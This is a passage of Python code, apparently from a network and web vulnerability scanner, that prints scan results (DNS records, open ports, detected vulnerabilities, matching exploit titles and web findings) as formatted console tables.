                if isinstance(records, list):
                    dns_table.add_row(record_type, "\n".join(records))
                else:
                    dns_table.add_row(record_type, str(records))
            
            if dns_info.get('subdomains'):
                dns_table.add_row("Subdomains", "\n".join(dns_info['subdomains']))
            
            if dns_info.get('spf_record'):
                dns_table.add_row("SPF", dns_info['spf_record'])
            
            if dns_info.get('dmarc_record'):
                dns_table.add_row("DMARC", dns_info['dmarc_record'])
            
            console.print(dns_table)
        
        # Display open ports and services
        ports = results.get('ports', [])
        if ports:
            port_table = Table(title="Open Ports and Services", show_header=True, header_style="bold magenta")
            port_table.add_column("Port", style="cyan", width=10)
            port_table.add_column("Service", style="green", width=20)
            port_table.add_column("Version", style="yellow", width=20)
            port_table.add_column("Details", style="blue", width=40)
            
            for port in ports:
                port_table.add_row(
                    str(port.get('port', '')),
                    port.get('service', ''),
                    f"{port.get('product', '')} {port.get('version', '')}",
                    port.get('extrainfo', '')
                )
            
            console.print(port_table)
        
        # Display vulnerabilities
        vulns = results.get('vulnerabilities', [])
        if vulns:
            vuln_table = Table(title="Detected Vulnerabilities", show_header=True, header_style="bold magenta")
            vuln_table.add_column("Port", style="cyan", width=10)
            vuln_table.add_column("Protocol", style="green", width=10)
            vuln_table.add_column("Vulnerability", style="yellow", width=30)
            vuln_table.add_column("Details", style="red", width=40)
            
            for vuln in vulns:
                vuln_table.add_row(
                    str(vuln.get('port', '')),
                    vuln.get('protocol', ''),
                    vuln.get('script', ''),
                    vuln.get('output', '')
                )
            
            console.print(vuln_table)
        
        # Display exploits
        exploits = results.get('exploits', [])
        if exploits:
            exploit_table = Table(title="Available Exploits", show_header=True, header_style="bold magenta")
            exploit_table.add_column("Service", style="cyan", width=20)
            exploit_table.add_column("Title", style="green", width=40)
            exploit_table.add_column("Type", style="yellow", width=15)
            exploit_table.add_column("Platform", style="blue", width=15)
            
            for exploit in exploits:
                exploit_table.add_row(
                    exploit.get('service', ''),
                    exploit.get('title', ''),
                    exploit.get('type', ''),
                    exploit.get('platform', '')
                )
            
            console.print(exploit_table)
        
        # Display web vulnerabilities
        web_vulns = results.get('web_vulnerabilities', [])
        if web_vulns:
            web_vuln_table = Table(title="Web Vulnerabilities", show_header=True, header_style="bold magenta")
            web_vuln_table.add_column("Vulnerability", style="cyan", width=30)
            web_vuln_table.add_column("Severity", style="yellow", width=10)
            web_vuln_table.add_column("Description", style="red", width=50)
            
            for vuln in web_vulns:
                severity_color = {
                    'High': 'red',
                    'Medium': 'yellow',
                    'Low': 'green'
                }.get(vuln.get('severity', ''), 'white')
                
                web_vuln_table.add_row(
                    vuln.get('name', ''),
                    f"[{severity_color}]{vuln.get('severity', '')}[/]",
                    vuln.get('description', '')
                )
            
            console.print(web_vuln_table) 